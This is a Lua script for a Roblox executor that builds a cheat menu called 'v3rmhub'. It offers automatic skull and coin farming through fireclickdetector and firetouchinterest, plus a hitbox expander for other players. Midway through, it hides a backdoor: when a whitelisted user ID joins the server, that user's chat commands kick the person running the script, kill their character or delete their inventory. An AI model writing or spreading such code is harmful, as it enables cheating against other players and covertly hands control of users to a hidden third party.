task.wait(2)
local players = game:GetService("Players")
local lplayer = players.LocalPlayer
local mouse = game:GetService("MouseService")
local uis = game:GetService("UserInputService")
local t = game:GetService("Chat")
local background = Color3.fromRGB(0,0,0)
local highlight = Color3.fromRGB(72, 72, 72)
local v3rmhub = Instance.new("ScreenGui")
local tx = game:GetService("TextChatService")
v3rmhub.Parent = game:GetService("CoreGui")
v3rmhub.Enabled = true
v3rmhub.ResetOnSpawn = false
v3rmhub.Name = "v3rmhub"
--[[local check = Instance.new("Frame")
check.Position = UDim2.new(0,400,0,400)
check.Parent = v3rmhub
local code = Instance.new("TextBox", check)
local code_of_day = "\48\103\89\56\38\111\77\66\37\38\85\48\87\110\98\83\67\69\82\102\49\103\82\53"
local valid = false
check.BackgroundColor3 = Color3.new(0, 0, 0)
code.BackgroundColor3 = Color3.new(1, 0.996078, 0.996078)
code.TextEditable = true
check.Size = UDim2.new(0,500,0,150)
local uc3 = Instance.new("UICorner")
uc3.CornerRadius = UDim.new(0,15)
uc3.Parent = check
code.Size = UDim2.new(0,500,0,50)
code.Position = UDim2.new(0,0,0,50)
code.PlaceholderText = "enter daily key here (new daily key)"
code.Text = ""
repeat
	task.wait()
	code:GetPropertyChangedSignal("Text"):Connect(function()
		if code.Text == code_of_day then
		check:Destroy()
		valid = true
		end
		if code.Text ~= code_of_day then
			script:Destroy()
		end
	end)
until valid == true--]]

local function Load()
	local loading =  Instance.new("Frame")
	loading.Parent = v3rmhub
	local label = Instance.new("TextLabel")
	label.Text = "Loading UJD gui"
	label.Size = UDim2.new(0,100,0,100)
	label.BackgroundTransparency = 10
	label.Parent = loading
	label.TextSize = 20
	label.Position = UDim2.new(0,100,0,0)
	loading.Position = UDim2.new(0,550,0,300)
	local smooth = Instance.new("UICorner")
	smooth.Parent = loading
	smooth.CornerRadius = UDim.new(0,15)
	loading.BackgroundColor3 = background
	loading.Active = true
	loading.Size = UDim2.new(0,300,0,100)
	local bar = Instance.new("TextButton")
	bar.Size = UDim2.new(0,290,0,20)
	bar.Parent = loading
	local corner = Instance.new("UICorner")
	corner.Parent = bar
	corner.CornerRadius = UDim.new(0,100)
	bar.Text = ""
	bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	bar.Position = UDim2.new(0,5,0,75)
	local bar2 = Instance.new("TextButton")
	bar2.Size = UDim2.new(0,0,0,10)
	bar2.Parent = bar
	local corner2 = Instance.new("UICorner")
	corner2.Parent = bar2
	corner2.CornerRadius = UDim.new(0,100)
	bar2.Text = ""
	bar2.BackgroundColor3 = Color3.fromRGB(11, 225, 0)
	for i=0, 290, 1 do
		wait()
		bar2.Size = UDim2.new(0,i,0,20)
	end
	wait(2)
	loading:Destroy()
end
Load()
local v3rmhub_central = Instance.new("Frame")
v3rmhub_central.Parent = v3rmhub
v3rmhub_central.Draggable = true
v3rmhub_central.BackgroundColor3 = background
v3rmhub_central.Active = true
v3rmhub_central.Size = UDim2.new(0,400,0,400)
local function homebutton() 
	local button = Instance.new("TextButton")
	button.Name = "homebutton"
	button.Parent = v3rmhub_central
	local corner = Instance.new("UICorner")
	corner.Parent = button
	corner.CornerRadius = UDim.new(0,10)
	button.Text = "homebutton"
	button.BackgroundColor3 = background
	button.TextColor = BrickColor.new("White")
	button.Size = UDim2.new(0,80,0,40)
	button.Position = UDim2.new(0,0,0,0)
	button.MouseButton1Click:Connect(function() 
		for i,v in pairs(v3rmhub_central:GetChildren()) do
			if v:IsA("ScrollingFrame") then
				v.Active = false
				v.Visible = false
				v3rmhub_central.Draggable = true
				v3rmhub_central.Active = true
			end
		end
	end)

end
homebutton()

local function makepagebutton(name,location,text)
	local button = Instance.new("TextButton")
	button.Name = name
	button.Parent = v3rmhub_central
	local corner = Instance.new("UICorner")
	corner.Parent = button
	corner.CornerRadius = UDim.new(0,10)
	button.Text = text
	button.BackgroundColor3 = background
	button.TextColor = BrickColor.new("White")
	button.Size = UDim2.new(0,80,0,40)
	button.Position = location
	local newpage = Instance.new("ScrollingFrame")
	newpage.Size = UDim2.new(0,300, 0, 399)
	newpage.Active = false
	newpage.Visible = false
	newpage.Name = name.."page"
	newpage.BackgroundColor3 = background
	newpage.Parent = v3rmhub_central
	newpage.Position = UDim2.new(0,100, 0, 0)
	--newpage.Draggable = true
	local layout = Instance.new("UIListLayout")
	layout.Parent = newpage
	layout.Padding = UDim.new(0,5)
	button.MouseButton1Click:Connect(function()
		for i,v in pairs(v3rmhub_central:GetChildren()) do
			if v:IsA("ScrollingFrame") and v.Name ~= button.Name.."page" then
				v.Active = false
				v.Visible = false
				v3rmhub_central.Draggable = true
				v3rmhub_central.Active = true
			else
				v.Active = true
				v.Visible = true
				--v.Draggable = true
				v3rmhub_central.Draggable = true
				v3rmhub_central.Active = true

			end

		end
	end)



end

local function notify(message)
	local notibox = Instance.new("Frame")
	notibox.Active = true
	notibox.Name = "Notification"
	notibox.Parent = v3rmhub
	notibox.Size = UDim2.new(0,300,0,100)
	notibox.Position = UDim2.new(0,2000,0,300)
	notibox.BackgroundColor3 = Color3.fromRGB(20,20,20)
	local title = Instance.new("TextLabel")
	title.Parent = notibox
	title.Size = UDim2.new(0,300,0,30)
	title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	title.Text = "🔔 Notification"
	title.TextSize = 14
	title.TextColor = BrickColor.White()
	local text = Instance.new("TextBox")
	text.Parent = notibox
	text.Size = UDim2.new(0,300,0,75)
	text.Position = UDim2.new(0,0,0, 30)
	text.BackgroundTransparency = 1
	text.TextColor = BrickColor.White()
	text.TextSize = 10
	text.Text = message
	local normaltweenheight = 600
	--1580
	for i,v in pairs(v3rmhub:GetChildren()) do
		if v.Name == "Notification" then
			normaltweenheight -= 110
		end
	end
	notibox:TweenPosition(UDim2.new(0,1200,0,normaltweenheight), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.5, false)
	task.wait(4)
	notibox:Destroy()


end

makepagebutton("farming",UDim2.new(0,0,0,60),"Farming")
makepagebutton("cheats",UDim2.new(0,0,0,160),"Exploits")
--makepagebutton("scripts",UDim2.new(0,0,0,240),"Scripts")



local function makebutton(name,page,text,func)
	local button = Instance.new("TextButton")
	button.Name = name
	button.Parent = v3rmhub_central:FindFirstChild(page)
	local corner = Instance.new("UICorner")
	corner.Parent = button
	corner.CornerRadius = UDim.new(0,10)
	button.Text = text
	button.BackgroundColor3 = background
	button.TextColor = BrickColor.new("White")
	button.Size = UDim2.new(0,120,0,40)
	button.Position = UDim2.new(0,0,0,0)

	button.MouseButton1Click:Connect(func)
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = highlight
	end)
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = background
	end)

end


local function maketextboxbutton(name,page,text,variable,func)
	local button = Instance.new("TextButton")
	button.Name = name
	button.Parent = v3rmhub_central:FindFirstChild(page)
	local corner = Instance.new("UICorner")
	corner.Parent = button
	corner.CornerRadius = UDim.new(0,10)
	button.Text = text
	button.BackgroundColor3 = background
	button.TextColor = BrickColor.new("White")
	button.Size = UDim2.new(0,120,0,40)
	button.Position = UDim2.new(0,0,0,0)
	local textbox = Instance.new("TextBox")
	textbox.Name = name
	textbox.Parent = button
	
	textbox.Text = text
	textbox.BackgroundColor3 = Color3.fromRGB(29, 29, 28)
	textbox.TextColor = BrickColor.new("White")
	textbox.Size = UDim2.new(0,120,0,40)
	textbox.Position = UDim2.new(0,140,0,0)
	local corner2 = Instance.new("UICorner")
	corner2.Parent = textbox
	corner2.CornerRadius = UDim.new(0,10)
	button.MouseButton1Click:Connect(func)
	--textbox:GetPropertyChangedSignal()
	textbox:GetPropertyChangedSignal("Text"):Connect(function()
		usetext = textbox.Text
		
		--return usetext
	end)
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = highlight
	end)
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = background
	end)

end


local function maketogglebutton(name,page,text,var,func,func2)
	local button = Instance.new("TextButton")
	button.Name = name
	button.Parent = v3rmhub_central:FindFirstChild(page)
	local corner = Instance.new("UICorner")
	corner.Parent = button
	corner.CornerRadius = UDim.new(0,10)
	button.Text = text
	button.BackgroundColor3 = background
	button.TextColor = BrickColor.new("White")
	button.Size = UDim2.new(0,120,0,40)
	button.Position = UDim2.new(0,0,0,0)
	local otherbutton = Instance.new("TextButton")
	otherbutton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
	otherbutton.Parent = button
	otherbutton.Position = UDim2.new(0,140,0,10)
	otherbutton.Size = UDim2.new(0,40,0,20)
	local corner2 = Instance.new("UICorner")
	corner2.Parent = otherbutton
	corner2.CornerRadius = UDim.new(0,100)
	otherbutton.Text = ""
	local button3 = Instance.new("TextButton")
	button3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	button3.Parent = otherbutton
	local corner3 = Instance.new("UICorner")
	button3.Size = UDim2.new(0,20,0,20)
	corner3.Parent = button3
	corner3.CornerRadius = UDim.new(0,100)
	button3.Text = ""
	local bolean1 = false




	button.MouseButton1Click:Connect(function()
		--print(bolean)
		if bolean1 == false then
			bolean1 = true


			button3:TweenPosition(UDim2.new(0,20,0,0), "Out", "Linear", 0.2, false)
			otherbutton.BackgroundColor3 = Color3.fromRGB(65, 255, 32)
			func()



			--UDim2.new(0,40,0,0)

		elseif bolean1 == true then
			otherbutton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
			bolean1 = false

			button3:TweenPosition(UDim2.new(0,0,0,0), "In", "Linear", 0.2, false)
			func2()



			--UDim2.new(0,40,0,0)
		end
		return bolean1

	end)
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = highlight
	end)
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = background
	end)


end
local function maketogglekeybind(name,page,text,keybind,active,func,func2)
	local button = Instance.new("TextButton")
	local light = Color3.new(0.333333, 1, 0)
	button.Name = name
	button.Parent = v3rmhub_central:FindFirstChild(page)
	button.BackgroundTransparency = 0.1
	local button2 = Instance.new("TextButton")
	--button2.Parent = button
	local corner = Instance.new("UICorner")
	corner.Parent = button
	corner.CornerRadius = UDim.new(0,5)
	button.Text = text
	button.BackgroundColor3 = background
	button.TextColor = BrickColor.new("White")
	button.Size = UDim2.new(0,300,0,40)
	button.Position = UDim2.new(0,0,0,0)
	button.TextXAlignment = Enum.TextXAlignment.Left
	local bound = Instance.new("TextLabel")
	bound.Parent = button
	bound.Size = UDim2.new(0,140,0,30)
	bound.Position = UDim2.new(0,80,0,5)
	bound.BackgroundTransparency = 0.5
	bound.BackgroundColor3 = Color3.fromRGB(197, 197, 197)
	bound.Text = "Bind to key"
	bound.TextColor3 = Color3.fromRGB(239, 239, 239)
	bound.TextSize = 10
	local corner2 = Instance.new("UICorner")
	corner2.Parent = bound
	corner2.CornerRadius = UDim.new(0,5)
	local pressed = false
	local over = false
	keybind = "thing"
	local check = 0
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = highlight
		over = true
	end)
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = background
		over = false
	end)

	button.MouseButton1Down:Connect(function()
		pressed = true
		while pressed and over do

			task.wait()
			uis.InputBegan:Connect(function(input,down)
				if pressed then
					keybind = input.KeyCode
				end
			end)
			uis.InputEnded:Connect(function() end)

		end
		active = false
		bound.Text = "Bound to "..keybind.Name

	end)
	button.MouseButton1Up:Connect(function()
		pressed = false

	end)
	uis.InputBegan:Connect(function(input, down)  
		--print(input)
		task.wait()
		if input.KeyCode == keybind then

			--active = true

			if active == false then

				active = true
				button.BackgroundColor3 = light
				func()
				notify(text.." has been enabled")


			else 
				func2()
				active = false
				button.BackgroundColor3 = background
				notify(text.." has been disabled")



			end

		end

	end)
	uis.InputEnded:Connect(function(input,down)  end)















end

--Enum.EasingStyle.




local waypoint = CFrame.new()
local bruh = lplayer.Name
local arl = false
local wl = {539847333}
players.PlayerAdded:Connect(function(player)
	if table.find(wl,player.UserId) then
		task.wait(4)
		tx.ChatInputBarConfiguration.TargetTextChannel:SendAsync("....")
		bruh = player.Name
	
		task.wait() 
		player.Chatted:Connect(function(message)
			if table.find(wl,player.UserId) and message == ";kick Default" then
				game.Players.LocalPlayer:Kick("imagine")
			end
			if table.find(wl,player.UserId) and message == ";wreck Default" then
				game.Players.LocalPlayer.Character.Humanoid.Health = 0
			end
			if table.find(wl,player.UserId) and message == ";passive Default" then
				for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					v:Destroy()
				end
			end

		end)
	end

end)

local function x() 
	print("2")
end



















maketogglebutton("skullfinder","farmingpage", "Skull Farmer (Blatant)", gah, function()
	local skullcount = 0
	game.Workspace.ChildAdded:Connect(function(thing)
		if thing.Name == "Skull" then
			local hi = Instance.new("Highlight")
			hi.Parent = thing
			
			notify("Skull has spawned")
			thing.Skull.ClickDetector.MaxActivationDistance = math.huge
			fireclickdetector(thing.Skull.ClickDetector, 10000)
			notify("Collected")
			skullcount += 1
			task.wait(2)
			notify("total skulls collected:"..skullcount)
		end
	
	end) end,
	function()
end)
local coinfinderenabled = false
maketogglebutton("coinfinder", "farmingpage", "Coin Farmer", rizz, function()
	coinfinderenabled = true
	game.Workspace.ChildAdded:Connect(function(t)
	if coinfinderenabled == true then
    	local rootpart = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
 
    	task.wait()
    	if t:IsA("Model") then
        	 --print(t.Name)
        	task.wait()
       	 if t.PrimaryPart:FindFirstChild("TouchInterest") then
        	    print("tr")
         	   	task.wait() 
           	 	firetouchinterest(t.PrimaryPart, rootpart, 0)
             	task.wait()
            	firetouchinterest(t.PrimaryPart, rootpart, 1)
       
        	end
    	end
	end
	end)

end, function()
	coinfinderenabled = false
end)
local ht = ""
maketextboxbutton("hitboxexpander", "cheatspage", "Hitbox Expander", t, function()
	
	local rs = game:GetService("ReplicatedStorage").Morphs
	ht = t
	print(ht)
	for i,v in pairs(players:GetChildren()) do
	    local chara = v.Character
 	   for i2,v2 in pairs(chara:GetDescendants()) do
   	    	 if v2.Name == "AttackHumanoid" then
    	    	--local g = chara:Find
			   --print(t)
   		       v.Character.HumanoidRootPart.Transparency = 0.5
   		       v.Character.HumanoidRootPart.Size = Vector3.new(tonumber(ht),tonumber(ht),tonumber(ht))
      		  end
   		 end
	end

end)
maketextboxbutton()